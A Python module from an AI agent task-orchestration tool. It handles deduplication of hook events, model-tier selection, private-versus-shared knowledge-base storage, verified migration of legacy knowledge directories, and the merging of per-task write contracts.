           "observed_dropped": obs_dropped,
           "truncated": truncated,
           "note": None if obs else
           "no dispatches observed — enable the check with "
           "TASKPLANE_ENFORCE_DISPATCH=warn|strict (PreToolUse Task hook)"}
    if truncated:
        # An audit that silently forgets is worse than one that says it
        # forgot: name the confidence bound on this run's numbers.
        rep["truncated_note"] = (
            f"dispatch-audit queues are capped at {_QUEUE_CAP} entries — "
            f"{exp_dropped} expected / {obs_dropped} observed entries were "
            "dropped, so 'unobserved' and 'mismatches' are a LOWER BOUND "
            "for this run")
    return rep


def _now() -> float:
    import time
    return time.time()


# Effective tier per loop step when a task doesn't override it. Reasoning-heavy
# steps ask for `deep` (a no-op unless the operator points DEEP at a stronger
# model); build/verify steps stay `standard`. A planner marks an individual
# SIMPLE task `"model": "cheap"` in tasks.json to route just that task cheaper.
STEP_DEFAULT_TIER = {
    "pm": "deep", "design": "deep", "plan": "deep", "em": "deep",
    "execute": "standard", "fix": "standard", "evaluate": "standard",
}


def model_for_tier(tier: str | None) -> str | None:
    """Resolve an abstract capability tier to a concrete model id for the Agent
    tool's `model` param, or None meaning "inherit the session model". The
    one-release alias is resolved inside the canonical loader. An unknown tier
    degrades to inherit (None) rather than raising."""
    t = (tier or "standard").strip().lower()
    return _default_tier_models().get(t)


def step_tier(step: str, task: dict | None = None) -> str:
    """The effective tier for a loop step: an explicit, valid per-task `model`
    tier wins; otherwise the step default (see STEP_DEFAULT_TIER). An invalid
    task tier is ignored (falls back to the step default)."""
    if task and task.get("model") in MODEL_TIERS:
        return task["model"]
    return STEP_DEFAULT_TIER.get(step, "standard")


def tp_dir(workspace: str) -> str:
    # Managed hybrid checkouts keep their complete control plane in the
    # canonical run root.  Unmanaged/local workspaces preserve the historic
    # per-checkout runtime for compatibility and isolated worktree workers.
    import storage as runtime_storage
    locator = runtime_storage.load_workspace_locator(workspace)
    if locator:
        return os.path.join(locator["paths"]["state"], "control")
    return os.path.join(workspace, ".taskplane")


# ----------------------------------------------- host hook exactly-once seam

HOOK_CLAIM_SCHEMA = "taskplane.hook-claims/v1"
HOOK_CLAIM_CAP = 512
HOOK_CLAIM_TTL_SECONDS = 24 * 60 * 60
HOOK_CLAIM_WAIT_SECONDS = 2.0
_HOOK_RESPONSE_CLASSES = frozenset(
    ("allow", "block", "advisory", "context", "empty", "error"))


def hook_claim_journal_path(workspace: str) -> str:
    """Per-checkout duplicate boundary; never committed or externally shared."""
    return os.path.join(tp_dir(_resolved_worktree(workspace)),
                        "hook-claims.json")


def _resolved_worktree(workspace: str) -> str:
    """Return the exact Git worktree root owning ``workspace``.

    Lifecycle hooks are frequently delivered with a component subdirectory as
    their cwd. Treating that raw cwd as the checkout identity split one host
    event into several claim journals. Conversely, resolving through the Git
    common directory would collapse sibling worktrees. ``--show-toplevel``
    provides the required middle ground: stable within one worktree and
    distinct across worktrees of the same repository.
    """
    candidate = _workspace_identity(workspace)
    try:
        top = _run(["git", "rev-parse", "--show-toplevel"], cwd=candidate) \
            .stdout.strip()
    except OSError:
        top = ""
    return _workspace_identity(top) if top else candidate


def _bounded_hook_identity(value, limit: int = 160) -> str:
    raw = str(value or "").encode("utf-8", errors="replace")[:limit]
    while raw:
        try:
            return raw.decode("utf-8")
        except UnicodeDecodeError:
            raw = raw[:-1]
    return ""


def hook_event_identity(workspace: str, action: str, event: dict) -> str:
    """Canonical stable hook identity, excluding prompts and tool arguments.

    Native and bridge entry points intentionally produce the same value.  A
    tool event needs a host call/event id; lifecycle events may use their
    bounded session + turn/child identity.  Returning ``""`` means the host
    supplied too little authority to deduplicate safely.
    """
    if not isinstance(event, dict):
        return ""
    action = _bounded_hook_identity(action, 64).strip().lower()
    event_name = _bounded_hook_identity(
        event.get("hook_event_name") or event.get("event_name") or action,
        64).strip()
    session = _bounded_hook_identity(
        event.get("session_id") or event.get("thread_id")
        or os.environ.get("CODEX_THREAD_ID")
        or os.environ.get("CLAUDE_SESSION_ID"), 160).strip()
    stable_id = _bounded_hook_identity(
        event.get("hook_event_id") or event.get("event_id")
        or event.get("tool_use_id") or event.get("call_id"), 160).strip()
    turn = _bounded_hook_identity(event.get("turn_id"), 160).strip()
    child = _bounded_hook_identity(
        event.get("agent_id") or event.get("child_id"), 160).strip()
    lower = event_name.lower().replace("_", "-")
    if not stable_id:
        if lower in {"sessionstart", "session-start", "stop", "sessionend",
                     "session-end"}:
            stable_id = turn or session
        elif lower in {"subagentstart", "subagent-start", "subagentstop",
                       "subagent-stop"}:
            stable_id = "|".join(part for part in (turn, child) if part)
    if not action or not event_name or not session or not stable_id:
        return ""
    payload = {
        "action": action,
        "event": event_name,
        "session": session,
        "event_identity": stable_id,
        "slot": _bounded_hook_identity(
            event.get("task_slot") or os.environ.get("TASKPLANE_TASK"),
            64).strip(),
        "workspace": hashlib.sha256(os.path.normcase(
            _resolved_worktree(workspace)).encode("utf-8")).hexdigest(),
    }
    return json.dumps(payload, sort_keys=True, separators=(",", ":"))


def _load_hook_claims(path: str) -> dict:
    journal = load_json(path, default={"schema": HOOK_CLAIM_SCHEMA,
                                      "claims": [], "owners": {}},
                        what="hook claim journal")
    if not isinstance(journal, dict) or journal.get("schema") != \
            HOOK_CLAIM_SCHEMA or not isinstance(journal.get("claims"), list):
        raise StateError(path, "invalid hook claim journal",
                         "remove it only after reviewing duplicate hook state")
    owners = journal.setdefault("owners", {})
    if not isinstance(owners, dict):
        raise StateError(path, "invalid hook owner registry")
    return journal


def claim_hook_event(workspace: str, action: str, event: dict, *,
                     hook_path: str, now: float | None = None,
                     wait_seconds: float = HOOK_CLAIM_WAIT_SECONDS) -> dict:
    """Claim one native/bridge hook event or replay its response class.

    The journal stores only a digest and bounded lifecycle metadata.  It does
    not persist the event, prompt, command, tool arguments, or host transcript.
    A duplicate pending claim waits at most two seconds, then returns a safe
    block instead of executing the action twice.
    """
    workspace = _resolved_worktree(workspace)
    identity = hook_event_identity(workspace, action, event)
    path_name = str(hook_path or "").strip().lower()
    if path_name not in {"native", "bridge"}:
        return {"schema": HOOK_CLAIM_SCHEMA,
                "status": "invalid_hook_path", "execute": False,
                "duplicate": False, "response_class": "block",
                "claim_id": None}
    if not identity:
        return {"schema": HOOK_CLAIM_SCHEMA,
                "status": "identity_unavailable", "execute": False,
                "duplicate": False, "response_class": "block",
                "claim_id": None}
    claim_id = hashlib.sha256(identity.encode("utf-8")).hexdigest()
    path = hook_claim_journal_path(workspace)
    current = _time.time() if now is None else float(now)
    deadline = _time.monotonic() + max(0.0, min(float(wait_seconds),
                                                 HOOK_CLAIM_WAIT_SECONDS))
    while True:
        with file_lock(path):
            journal = _load_hook_claims(path)
            fresh = []
            for row in journal["claims"]:
                if not isinstance(row, dict):
                    raise StateError(path, "corrupt hook claim row")
                try:
                    updated = float(row.get("updated_at"))
                except (TypeError, ValueError):
                    raise StateError(path, "corrupt hook claim timestamp") from None
                if current - updated <= HOOK_CLAIM_TTL_SECONDS:
                    fresh.append(row)
            prior = next((row for row in fresh
                          if row.get("claim_id") == claim_id), None)
            if prior is None:
                owner_pid = os.getpid()
                owner_id = hashlib.sha256(
                    f"{claim_id}:{owner_pid}:{current}".encode()).hexdigest()
                row = {
                    "claim_id": claim_id,
                    "created_at": current,
                    "updated_at": current,
                    "status": "pending",
                    "response_class": None,
                    "hook_path": path_name,
                }
                fresh.append(row)
                journal["claims"] = fresh[-HOOK_CLAIM_CAP:]
                journal["owners"][claim_id] = {
                    "owner_pid": owner_pid, "owner_id": owner_id}
                atomic_write_json(path, journal, sort_keys=True)
                return {"schema": HOOK_CLAIM_SCHEMA, "status": "claimed",
                        "execute": True, "duplicate": False,
                        "response_class": None, "claim_id": claim_id,
                        "owner_id": owner_id}
            owner = journal["owners"].get(claim_id) or {}
            owner_id = str(owner.get("owner_id") or "")
            owner_pid = owner.get("owner_pid")
            if prior.get("status") == "completed" and \
                    prior.get("response_class") in _HOOK_RESPONSE_CLASSES:
                return {"schema": HOOK_CLAIM_SCHEMA, "status": "replay",
                        "execute": False, "duplicate": True,
                        "response_class": prior["response_class"],
                        "claim_id": claim_id, "owner_id": owner_id}
            if prior.get("status") != "pending":
                raise StateError(path, "corrupt hook claim status")
            if not isinstance(owner_pid, int) or owner_pid <= 0 or \
                    not owner_id or not _pid_alive(owner_pid):
                new_pid = os.getpid()
                new_id = hashlib.sha256(
                    f"{claim_id}:{new_pid}:{current}:recovered".encode()
                ).hexdigest()
                journal["owners"][claim_id] = {
                    "owner_pid": new_pid, "owner_id": new_id}
                prior["updated_at"] = current
                prior["hook_path"] = path_name
                atomic_write_json(path, journal, sort_keys=True)
                return {"schema": HOOK_CLAIM_SCHEMA, "status": "recovered",
                        "execute": True, "duplicate": True,
                        "response_class": None, "claim_id": claim_id,
                        "owner_id": new_id}
        if _time.monotonic() >= deadline:
            return {"schema": HOOK_CLAIM_SCHEMA,
                    "status": "duplicate_pending", "execute": False,
                    "duplicate": True, "response_class": "empty",
                    "claim_id": claim_id, "owner_id": owner_id}
        _time.sleep(0.05)


def complete_hook_event(workspace: str, claim: dict, *,
                        response_class: str,
                        now: float | None = None) -> dict:
    """Complete a claim with the only replayable datum: response class."""
    response = str(response_class or "").strip().lower()
    if response not in _HOOK_RESPONSE_CLASSES:
        raise ValueError("unsupported hook response class")
    claim_id = claim.get("claim_id") if isinstance(claim, dict) else None
    if not isinstance(claim_id, str) or not re.fullmatch(r"[0-9a-f]{64}",
                                                         claim_id):
        raise ValueError("completion needs a valid hook claim id")
    workspace = _resolved_worktree(workspace)
    path = hook_claim_journal_path(workspace)
    current = _time.time() if now is None else float(now)
    with file_lock(path):
        journal = _load_hook_claims(path)
        row = next((item for item in journal["claims"]
                    if isinstance(item, dict)
                    and item.get("claim_id") == claim_id), None)
        if row is None:
            raise StateError(path, "hook claim disappeared before completion")
        owner = journal.get("owners", {}).get(claim_id) or {}
        if claim.get("owner_id") != owner.get("owner_id"):
            raise StateError(path, "hook claim completion owner mismatch")
        if row.get("status") == "completed":
            if row.get("response_class") != response:
                raise StateError(path, "contradictory hook completion")
            return {"schema": HOOK_CLAIM_SCHEMA, "status": "completed",
                    "claim_id": claim_id, "response_class": response}
        if row.get("status") != "pending":
            raise StateError(path, "corrupt hook claim status")
        row["status"] = "completed"
        row["response_class"] = response
        row["updated_at"] = current
        atomic_write_json(path, journal, sort_keys=True)
    return {"schema": HOOK_CLAIM_SCHEMA, "status": "completed",
            "claim_id": claim_id, "response_class": response}


# ------------------------------------------------------ external KB store
#
# The knowledge base used to live in <repo>/knowledge/, so every decision,
# requirement, graph and index got committed and pushed with the code. It now
# lives OUTSIDE the repo, one folder per project, mirroring how Claude keys
# its own per-project state under ~/.claude/projects/<slugified-path>/.

def store_home() -> str:
    """Root of the taskplane store — holds every project's KB, out of any
    repo. Defaults to ~/.taskplane; TASKPLANE_HOME overrides it (tests, or a
    synced/shared drive)."""
    return (os.environ.get("TASKPLANE_HOME")
            or os.path.join(os.path.expanduser("~"), ".taskplane"))


def _workspace_identity(workspace: str) -> str:
    """Canonical checkout identity shared by parent and child processes."""
    return os.path.realpath(os.path.abspath(workspace))


def _path_slug(workspace: str) -> str:
    ap = _workspace_identity(workspace)
    return re.sub(r"[^A-Za-z0-9]+", "-", ap) or "-"


def project_key(workspace: str) -> str:
    """Stable, COLLISION-FREE per-project key: a readable path slug plus a
    short hash of the canonical absolute path.

    The slug alone (the v0.9.6 scheme) collapses every run of non-alphanumerics
    to '-', so distinct projects whose paths differ only by punctuation —
    /x/my-app, /x/my_app, /x/my.app — all map to ONE key and silently share a
    store (KB, requirements, and loop.json — a gate in one corrupts the other).
    An 8-char hash guarantees distinct keys while the slug stays readable."""
    # A managed hybrid checkout carries one validated, ignored locator.  It
    # binds every clone/worktree of the same hosted repository to the same
    # durable project knowledge root while run state remains run-scoped.
    # Local/unmanaged checkouts preserve the historical path identity.
    import storage as runtime_storage
    locator = runtime_storage.load_workspace_locator(workspace)
    if locator:
        return str(locator["repository_key"])
    ap = _workspace_identity(workspace)
    slug = _path_slug(workspace)
    readable = slug[:80].rstrip("-") if len(slug) > 80 else slug
    return f"{readable}-{hashlib.sha1(ap.encode('utf-8')).hexdigest()[:8]}"


def _adopt_alias_store(workspace: str, new_root: str) -> None:
    """Adopt a pre-canonical store whose metadata names the same checkout."""
    import shutil
    projects = os.path.join(store_home(), "projects")
    if os.path.isdir(new_root) or not os.path.isdir(projects):
        return
    identity = _workspace_identity(workspace)
    for name in sorted(os.listdir(projects)):
        candidate = os.path.join(projects, name)
        if candidate == new_root or not os.path.isdir(candidate):
            continue
        try:
            with open(os.path.join(candidate, "meta.json"), encoding="utf-8") as f:
                meta = json.load(f)
            owner = meta.get("workspace_realpath") or meta.get("workspace")
            if not owner or _workspace_identity(owner) != identity:
                continue
            os.makedirs(os.path.dirname(new_root), exist_ok=True)
            shutil.move(candidate, new_root)
            return
        except (OSError, ValueError):
            continue


def _adopt_legacy_store(workspace: str, new_root: str) -> None:
    """One-time in-place migration for stores created under the v0.9.6 pure-
    slug key. If a legacy `projects/<slug>/` dir exists and belongs to THIS
    workspace (its meta records our abspath, or it has no meta), move it to the
    collision-free key so existing KB/loop state is preserved. A legacy store
    another workspace already claimed (meta workspace differs) is left untouched
    — that is the collision this fix removes, so this project starts fresh."""
    import shutil
    legacy_root = os.path.join(store_home(), "projects", _path_slug(workspace))
    if legacy_root == new_root or not os.path.isdir(legacy_root):
        return
    ap = _workspace_identity(workspace)
    owns = None                 # True=provably ours, False=sibling's,
    try:                        # None=unprovable (no/unreadable meta)
        with open(os.path.join(legacy_root, "meta.json"), encoding="utf-8") as f:
            owner = json.load(f).get("workspace")
        if owner:
            owns = _workspace_identity(owner) == ap
    except (OSError, ValueError):
        owns = None
    if owns is False:
        return                  # belongs to a colliding sibling — don't steal
    try:
        os.makedirs(os.path.dirname(new_root), exist_ok=True)
        if owns:
            shutil.move(legacy_root, new_root)
        else:
            # Ownership unprovable (pre-meta store; two punctuation-colliding
            # projects share this slug). COPY and leave the original in place
            # so a rightful sibling never silently loses its KB to a
            # destructive move (v2.3.0).
            shutil.copytree(legacy_root, new_root)
    except OSError:
        pass


def store_env() -> str:
    """The TASKPLANE_STORE override, normalized ('repo' | 'external' | '').
    One reader so the kernel and loop can't drift on how the env is parsed."""
    return os.environ.get("TASKPLANE_STORE", "").strip().lower()


def host(env=None) -> str:
    """'codex' | 'claude-tag' | 'claude' — THE host-detection seam (v2.3.0).

    Previously re-implemented in three places (_default_tier_models,
    tp._onboard_report, loop.user_summary) with divergent results; every
    host probe now goes through this one function. `env` is injectable for
    tests (defaults to os.environ)."""
    e = os.environ if env is None else env
    if e.get("CODEX_HOME") or e.get("CODEX_THREAD_ID"):
        return "codex"
    if (e.get("TASKPLANE_STORE") or "").strip().lower() == "repo":
        return "claude-tag"
    return "claude"


def external_store_root(workspace: str) -> str:
    """The classic PRIVATE external store (~/.taskplane/projects/<key>/),
    resolved unconditionally — mode config never redirects this. It is the
    private side of `tp share push` and the home of mode.json itself."""
    import storage as runtime_storage
    locator = runtime_storage.load_workspace_locator(workspace)
    home = str(locator["home"]) if locator else store_home()
    root = os.path.join(home, "projects", project_key(workspace))
    if not os.path.isdir(root):
        _adopt_alias_store(workspace, root)
        _adopt_legacy_store(workspace, root)
    return root


def repo_store_root(workspace: str) -> str:
    """The SHARED in-repo store (<ws>/.taskplane-kb/) — committed with the
    work, so it survives Claude Tag's ephemeral sandbox and is visible to
    every teammate who clones the branch."""
    return os.path.join(os.path.abspath(workspace), ".taskplane-kb")


def _mode_file(workspace: str) -> str:
    return os.path.join(external_store_root(workspace), "mode.json")


def _remote_mode_file(workspace: str) -> str | None:
    """Fallback mode file keyed by the git remote URL, so plan/privacy
    settings follow the REPO across checkouts/paths (a second clone without
    its own mode.json inherits the user's choice, closing the quiet privacy
    hole where `share set private` in checkout A did nothing in checkout B)."""
    if not os.path.isdir(workspace):
        return None
    try:
        r = _run(["git", "remote", "get-url", "origin"], cwd=workspace)
        url = (r.stdout or "").strip()
    except OSError:
        return None
    if not url:
        return None
    h = hashlib.sha1(url.encode("utf-8")).hexdigest()[:16]
    return os.path.join(store_home(), "modes", f"{h}.json")


def _read_personal_mode(workspace: str) -> tuple[dict, bool]:
    """(settings, found) — path-keyed mode.json first; the remote-keyed
    fallback (which shells out to git) is consulted only on a miss.

    FAIL SAFE (v2.3.0): a mode file that EXISTS but won't read/parse is a
    damaged privacy control, not "no setting recorded". Resolve it as
    private=True — the more restrictive residency — so corruption can never
    silently downgrade a user's `share set private` to the committed SHARED
    in-repo store. (set_mode heals the file on the next explicit setting.)"""
    for p in (_mode_file(workspace), _remote_mode_file(workspace)):
        if not p:
            continue
        try:
            with open(p, encoding="utf-8") as f:
                return json.load(f), True
        except FileNotFoundError:
            continue
        except (OSError, ValueError):
            return {"private": True}, True   # corrupt/unreadable -> private
    return {}, False


def _persistent_mode(workspace: str) -> dict:
    """Mode resolution EXCLUDING the TASKPLANE_STORE env override — the
    durable truth that set_mode may materialize into a committed config.
    (v1.5.1: deciding the config.json write from the env-influenced mode let
    a transient env var create a committable artifact for the whole team.)

    A committed shared config expresses the repository owner's preference;
    it is not consent from a newly arrived user.  Until that user records a
    local choice, keep writes in the external store and make the one-command
    shared opt-in explicit.  Managed hosts that deliberately force
    ``TASKPLANE_STORE=repo`` still take the environment-override path in
    :func:`get_mode`.
    """
    personal, found = _read_personal_mode(workspace)
    plan = personal.get("plan")
    private = bool(personal.get("private"))
    if private:
        return {"plan": plan, "store": "external", "private": True,
                "source": "private-setting"}
    shared_cfg = os.path.join(repo_store_root(workspace), "config.json")
    if os.path.exists(shared_cfg):
        if not plan:
            try:
                with open(shared_cfg, encoding="utf-8") as f:
                    plan = json.load(f).get("plan")
            except (AttributeError, OSError, ValueError):
                pass
        if not found:
            return {
                "plan": plan or "team",
                "store": "external",
                "private": True,
                "source": "shared-config-unconfirmed",
                "notice": (
                    "this repo offers a SHARED in-repo store "
                    "(.taskplane-kb/ — committed with the code), but this "
                    "new local user remains PRIVATE in the external store "
                    "until sharing is explicitly confirmed. Run `tp share "
                    "set shared` to opt in; `tp share set private` keeps "
                    "knowledge local."
                ),
            }
        out = {"plan": plan or "team", "store": "repo", "private": False,
               "source": "shared-config"}
        return out
    if plan in ("team", "enterprise"):
        return {"plan": plan, "store": "repo", "private": False,
                "source": "plan"}
    return {"plan": plan or "personal", "store": "external",
            "private": False, "source": "default"}


def get_mode(workspace: str) -> dict:
    """v1.5.0 — plan-aware store resolution. Returns
    {"plan", "store" ("external"|"repo"), "private", "source"[, "notice"]}.

    Precedence:
      1. TASKPLANE_STORE env (explicit override — Tag skill, tests)
      2. the user's PRIVATE setting (mode.json; also remote-keyed fallback)
      3. the user's recorded shared choice
      4. an unconfirmed committed shared config remains external/private
      5. the recorded plan: team/enterprise -> repo, personal -> external
      6. default: external (personal)."""
    env = store_env()
    if env in ("repo", "external"):
        personal, _ = _read_personal_mode(workspace)
        return {"plan": personal.get("plan"), "store": env,
                "private": bool(personal.get("private")), "source": "env"}
    return _persistent_mode(workspace)


def set_mode(workspace: str, plan: str | None = None,
             private: bool | None = None) -> dict:
    """Update the plan and/or private flag (both changeable any time).
    Personal settings persist in the external store's mode.json AND a
    remote-keyed copy (so they follow the repo across checkouts). The
    committed shared config (<ws>/.taskplane-kb/config.json) is written
    ONLY from the env-independent resolution, and ONLY for an explicit
    team/enterprise plan — a transient TASKPLANE_STORE, or one user's
    personal-plan declaration, must never rewrite the team's file."""
    cfg, _ = _read_personal_mode(workspace)
    if plan is not None:
        cfg["plan"] = plan
        if plan == "personal":
            # A personal-plan selection is an explicit private/local choice,
            # not acknowledgement of a repository's shared-store proposal.
            cfg["private"] = True
    if private is not None:
        cfg["private"] = bool(private)
    targets = [p for p in (_mode_file(workspace),
                           _remote_mode_file(workspace)) if p]
    wrote_any, last_err = False, None
    for p in targets:
        try:
            # Atomic (v2.3.0): mode.json is the private-vs-shared CONTROL
            # file — a torn write must keep the old file, never drop the
            # user's `private` flag.
            atomic_write_json(p, cfg, indent=2)
            wrote_any = True
        except OSError as e:
            last_err = e
    if targets and not wrote_any:
        # Every persistence target failed — a silent no-op here means the
        # user's `share set private` never took effect. Surface it. (v1.5.2)
        raise OSError(f"could not persist taskplane mode to any of "
                      f"{targets}: {last_err}")
    persistent = _persistent_mode(workspace)
    if persistent["store"] == "repo" \
            and persistent["plan"] in ("team", "enterprise") \
            and cfg.get("plan") in ("team", "enterprise"):
        try:
            os.makedirs(repo_store_root(workspace), exist_ok=True)
            with open(os.path.join(repo_store_root(workspace),
                                   "config.json"), "w", encoding="utf-8") as f:
                json.dump({"plan": persistent["plan"], "store": "repo"},
                          f, indent=2)
        except OSError:
            pass
    return get_mode(workspace)


def store_root(workspace: str) -> str:
    """This project's store dir — external (private, ~/.taskplane) or
    in-repo (<ws>/.taskplane-kb, the Claude Tag / team-shared mode),
    resolved by get_mode(): TASKPLANE_STORE env wins, then the user's
    private setting, then a committed shared config, then the plan
    (team/enterprise -> repo, personal -> external)."""
    if get_mode(workspace)["store"] == "repo":
        return repo_store_root(workspace)
    return external_store_root(workspace)


def kb_root(workspace: str) -> str:
    """The knowledge-base dir for a project — the external replacement for the
    old in-repo <ws>/knowledge/. Resolution, with a no-surprises fallback:

      * external store exists            -> use it (migrated / new writes)
      * else a legacy in-repo knowledge/ -> use IT (unmigrated project keeps
                                            working in place until `tp kb
                                            migrate` / `tp init` relocates it)
      * else (brand-new project)         -> external store (repo stays clean
                                            from the very first write)

    Reads and writes share this root, so a reader never sees an empty store
    while the real data still sits in the repo."""
    ext = os.path.join(store_root(workspace), "knowledge")
    legacy = os.path.join(workspace, "knowledge")
    # If both roots exist, only a tree published by the verified migration
    # protocol may supersede the complete legacy source. An unmarked external
    # directory can be the residue of shutil.move's cross-filesystem copy
    # fallback and must not hide source-only knowledge.
    if os.path.isdir(ext) and (
            not os.path.isdir(legacy) or _kb_migration_complete(ext)):
        return ext
    if os.path.isdir(legacy):
        return legacy
    return ext


def store_meta_path(workspace: str) -> str:
    return os.path.join(store_root(workspace), "meta.json")


def _quarantine_shared_store_meta(path: str) -> str | None:
    """Move a stale shared locator into private recovery storage."""
    if not os.path.lexists(path):
        return None
    quarantine = os.path.join(store_home(), "privacy-quarantine")
    _durable_makedirs(quarantine)
    identity = hashlib.sha256(os.path.abspath(path).encode("utf-8")).hexdigest()
    destination = os.path.join(quarantine, f"store-meta-{identity}.json")
    if os.path.exists(destination):
        destination += "." + secrets.token_hex(8)
    os.replace(path, destination)
    _fsync_directory(os.path.dirname(path) or ".")
    _fsync_directory(quarantine)
    return destination


def write_store_meta(workspace: str) -> dict:
    """Record the store owner without publishing workstation identity.

    The private external store retains the exact checkout locator needed by
    legacy adoption and local recovery.  A repository store is committed and
    shared, so it carries only stable pseudonyms and a repository fingerprint;
    neither an absolute path nor a credential-bearing remote URL crosses that
    boundary.
    """
    root = store_root(workspace)
    os.makedirs(root, exist_ok=True)
    remote = _run(["git", "config", "--get", "remote.origin.url"],
                  cwd=workspace).stdout.strip() or None
    shared = get_mode(workspace)["store"] == "repo"
    if shared:
        workspace_digest = hashlib.sha256(
            _workspace_identity(workspace).encode("utf-8")).hexdigest()
        repository_material = remote or project_key(workspace)
        meta = {
            "schema": "taskplane.store-meta/v2",
            "shared": True,
            "workspace_key": "workspace:" + workspace_digest[:24],
            "repository_fingerprint": hashlib.sha256(
                repository_material.encode("utf-8")).hexdigest(),
        }
    else:
        meta = {"key": project_key(workspace),
                "workspace": os.path.abspath(workspace),
                "workspace_realpath": _workspace_identity(workspace),
                "git_remote": remote,
                "shared": False}
    path = store_meta_path(workspace)
    try:
        atomic_write_json(path, meta, indent=2,
                          sort_keys=True)
    except OSError as exc:
        if shared:
            try:
                quarantined = _quarantine_shared_store_meta(path)
            except OSError as quarantine_error:
                raise StateError(
                    path, "shared store metadata write failed and stale raw "
                    "metadata could not be quarantined",
                    str(quarantine_error)) from exc
            raise StateError(
                path, "shared store metadata write failed closed",
                ("stale raw metadata moved to private quarantine " +
                 str(quarantined)) if quarantined else
                "no shared metadata was published") from exc
        raise StateError(path, "private store metadata write failed",
                         str(exc)) from exc
    return meta


_KB_MIGRATION_MARKER = ".taskplane-migration.json"


def _kb_tree_manifest(root: str) -> list[dict]:
    """Content manifest for a KB tree, excluding our publication marker."""
    manifest: list[dict] = []
    for current, dirs, files in os.walk(root, topdown=True,
                                        followlinks=False):
        dirs.sort()
        files.sort()
        rel_current = os.path.relpath(current, root)
        prefix = "" if rel_current == "." else rel_current.replace("\\", "/")
        descend = []
        for name in dirs:
            full = os.path.join(current, name)
            rel = "/".join(filter(None, (prefix, name)))
            if os.path.islink(full):
                manifest.append({"path": rel, "type": "link",
                                 "target": os.readlink(full)})
            else:
                manifest.append({"path": rel + "/", "type": "dir"})
                descend.append(name)
        dirs[:] = descend
        for name in files:
            rel = "/".join(filter(None, (prefix, name)))
            if rel == _KB_MIGRATION_MARKER:
                continue
            full = os.path.join(current, name)
            if os.path.islink(full):
                manifest.append({"path": rel, "type": "link",
                                 "target": os.readlink(full)})
                continue
            if not os.path.isfile(full):
                raise StateError(full, "unsupported knowledge entry",
                                 "replace it with a regular file or symlink")
            digest = hashlib.sha256()
            with open(full, "rb") as handle:
                for chunk in iter(lambda: handle.read(1024 * 1024), b""):
                    digest.update(chunk)
            manifest.append({"path": rel, "type": "file",
                             "size": os.path.getsize(full),
                             "sha256": digest.hexdigest()})
    return manifest


def _kb_manifest_digest(manifest: list[dict]) -> str:
    raw = json.dumps(manifest, sort_keys=True, separators=(",", ":")).encode()
    return hashlib.sha256(raw).hexdigest()


def _kb_migration_complete(root: str) -> bool:
    marker = os.path.join(root, _KB_MIGRATION_MARKER)
    try:
        record = load_json(marker, what="knowledge migration marker")
        return record.get("schema") == 1 and record.get("manifest_sha256") == \
            _kb_manifest_digest(_kb_tree_manifest(root))
    except (StateError, OSError, AttributeError):
        return False


def _fsync_kb_tree(root: str) -> None:
    """Flush copied KB bytes and directory entries before publication."""
    directories = []
    for current, dirs, files in os.walk(root, topdown=True,
                                        followlinks=False):
        directories.append(current)
        dirs[:] = [name for name in dirs
                   if not os.path.islink(os.path.join(current, name))]
        for name in files:
            path = os.path.join(current, name)
            if os.path.islink(path) or not os.path.isfile(path):
                continue
            with open(path, "rb") as handle:
                os.fsync(handle.fileno())
    for directory in reversed(directories):
        _fsync_directory(directory)


def migrate_store(workspace: str) -> dict:
    """Publish a verified legacy KB tree, then remove its source.

    Copying occurs in a unique sibling staging directory. The destination is
    authoritative only after byte-manifest verification, fsync, an atomic
    rename, and a parent-directory fsync. Interrupted or old partial final
    directories are quarantined instead of hiding the legacy source.
    """
    import shutil
    legacy = os.path.join(workspace, "knowledge")
    ext = os.path.join(store_root(workspace), "knowledge")
    moved = False
    parent = os.path.dirname(ext)
    os.makedirs(parent, exist_ok=True)
    lock_path = os.path.join(parent, ".knowledge-migration")
    with file_lock(lock_path):
        if os.path.isdir(legacy):
            if os.path.isdir(ext) and _kb_migration_complete(ext):
                shutil.rmtree(legacy)
                moved = True
            else:
                if os.path.isdir(ext):
                    quarantine = os.path.join(
                        parent, f"knowledge.partial.{os.getpid()}."
                        f"{secrets.token_hex(8)}")
                    os.rename(ext, quarantine)
                    _fsync_directory(parent)
                stage = os.path.join(
                    parent, f".knowledge.migrate.{os.getpid()}."
                    f"{secrets.token_hex(8)}")
                try:
                    before = _kb_tree_manifest(legacy)
                    shutil.copytree(legacy, stage, symlinks=True)
                    after = _kb_tree_manifest(legacy)
                    copied = _kb_tree_manifest(stage)
                    if before != after or after != copied:
                        raise StateError(
                            legacy, "knowledge changed during migration",
                            "retry when no writer is changing the knowledge tree")
                    _fsync_kb_tree(stage)
                    atomic_write_json(
                        os.path.join(stage, _KB_MIGRATION_MARKER),
                        {"schema": 1,
                         "manifest_sha256": _kb_manifest_digest(copied)},
                        sort_keys=True)
                    os.rename(stage, ext)
                    _fsync_directory(parent)
                    shutil.rmtree(legacy)
                    moved = True
                finally:
                    if os.path.isdir(stage):
                        shutil.rmtree(stage, ignore_errors=True)
    write_store_meta(workspace)
    return {"moved": moved, "store": ext, "legacy": legacy}


def list_task_slots(workspace: str) -> list:
    """Names of the per-task contract slots currently active under
    .taskplane/active/ (tombstones, snapshots and atomic-write temps are not
    slots)."""
    d = os.path.join(tp_dir(workspace), "active")
    try:
        names = os.listdir(d)
    except OSError:
        return []
    return sorted(n[:-5] for n in names
                  if n.endswith(".json") and not n.startswith("."))


def _common_write_root(contracts: list) -> "str | None":
    """The single directory every member's write_allow lives under, or None.

    This is the test for a SIBLING WAVE: N contracts minted by one dispatch,
    each owning its own artifact directory beneath a common review root
    (`.em-review/lens-security/**`, `.em-review/lens-qa/**`, …). It is a
    deliberately narrow shape and every clause matters — a member that can
    write outside the root, or writes nothing, or is not read-only, is not a
    sibling and the caller must fall back to intersection.
    """
    if len(contracts) < 2:
        return None
    root = None
    for c in contracts:
        if not c.get("read_only"):
            return None            # a writer is never a review sibling
        allow = c.get("write_allow") or []
        if not allow:
            return None            # nothing to merge
        for g in allow:
            g = str(g).replace("\\", "/").lstrip("./")
            head = g.split("/", 1)[0]
            if not head or head in ("*", "**") or head.startswith(".."):
                return None        # unrooted or escaping — not a sibling
            if root is None:
                root = head
            elif head != root:
                return None        # different roots — genuinely competing
    return root


def _union_contract(contracts: list) -> dict:
    """The MOST RESTRICTIVE union of several active contracts — what governs
    a process that carries no TASKPLANE_TASK while per-task contracts are
    active. An action passes only if EVERY member contract approves it
    (screen_tool recurses over ``_union``); the budget ceiling is the
    minimum of the members'; read_only if ANY member is. Never pick one
    contract arbitrarily — that re-opens the exact overwrite/void-enforcement
    bug the per-task slots fixed (v2.3.0)."""
